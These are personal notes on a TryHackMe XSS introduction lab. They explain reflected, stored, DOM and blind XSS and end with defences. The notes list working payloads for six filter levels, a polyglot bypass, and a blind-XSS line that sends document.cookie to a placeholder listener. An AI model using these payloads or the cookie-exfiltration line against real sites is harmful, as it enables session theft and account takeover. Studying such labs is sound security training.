# XSS Introduction (TryHackMe)

- **Path:** Jr Penetration Tester > Web Application Vulnerabilities I
- **Completed:** 2026-10-10 - **Target:** <ip> (Atlas News :5000, Acme IT Support :8080, levels :80)

XSS = inject JavaScript that runs in another user's browser in the site's origin. Root cause:
untrusted input output as code instead of escaped. Can read/modify the DOM, steal non-HttpOnly
cookies, make requests, act as the user.

## Answer sheet

| Task | Question | Answer |
|---|---|---|
| 2 | URL parameter in ...?text= | *(find it yourself)* |
| 2 | Scripting language for the DOM | *(find it yourself)* |
| 3 | Document property with session token | *(find it yourself)* |
| 3 | JS method used as PoC | *(find it yourself)* |
| 4 | Alert text after success | *(find it yourself)* |
| 4 | Response to alert('Test123') | *(find it yourself)* |
| 5 | Stored XSS alert text | *(find it yourself)* |
| 6 | DOM XSS alert text | *(find it yourself)* |
| 6 | Does DOM XSS occur server-side? | *(find it yourself)* |
| 7 | XSS most similar to Blind | *(find it yourself)* |
| 7 | Connection value in netcat callback | *(find it yourself)* |
| 8 | Level 6 flag (final flag) | THM{…} |

## The types
- Reflected (non-persistent): input echoed straight back in the response (?q= search). Needs the
  victim to click your crafted link. Atlas News :5000 /, payload <script>alert('Hack')</script>.
- Stored (persistent): input saved server-side and served to everyone (guestbook). Highest impact,
  hits admins. Root cause here: template used |safe, bypassing auto-escaping.
- DOM-based (client-side): JS reads attacker data from the DOM (location.hash/search, etc.) and
  writes it to a dangerous sink (innerHTML/document.write/eval). Never touches the server, so
  server-side filters do not help (it never reaches the server). Payload: <img src=x onerror="alert('...')">.
- Blind: stored but you cannot see it fire; add a callback so you know when a staff browser runs it
  (fetch to your listener). Needs an inbound listener (AttackBox; VPN inbound is firewalled).
  Cookie exfil shape: </textarea><script>fetch('http://LISTENER:PORT?c='+btoa(document.cookie))</script>

## Payload escaping ladder (Task 8 levels, port 80)
- L1 reflected in HTML body: <script>alert('THM');</script>
- L2 inside input value: "><script>alert('THM');</script>  (break out of the attribute+tag)
- L3 inside textarea: </textarea><script>alert('THM');</script>
- L4 inside a JS string: ';alert('THM');//   (close string, end statement, comment the rest)
- L5 word filter strips "script": <sscriptcript>alert('THM');</sscriptcript>  (filter removes the
  inner "script", leaving a valid <script>)
- L6 < and > stripped, reflected in an img src: /images/cat.jpg" onload="alert('THM');
  (use an event handler instead of new tags)
- Polyglot that beats all six at once:
  jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e

## How the level flag was pulled (mechanism note)
Each /level6 load mints a per-load hash and embeds fetch('/check/<hash>'). The server renders your
payload in a HEADLESS browser; if alert fired, /check/<hash> returns {triggered:true, flag}. curl
alone showed nothing (no JS run), so: GET /level6?payload=<correct>, extract the hash, poll
/check/<hash> -> THM{…}. Lesson: these labs verify real JS EXECUTION, not just reflection.

## Lessons / defence
- Escape output for the context (HTML/attr/JS/URL). Use framework auto-escaping; never |safe on
  untrusted data. For DOM XSS use textContent / safe DOM APIs, not innerHTML.
- HttpOnly cookies stop JS from reading session tokens. CSP limits what injected script can do.
- Input filters (blocklists) are bypassable (sscriptcript, event handlers, polyglots); allowlist +
  output encoding is the real fix.
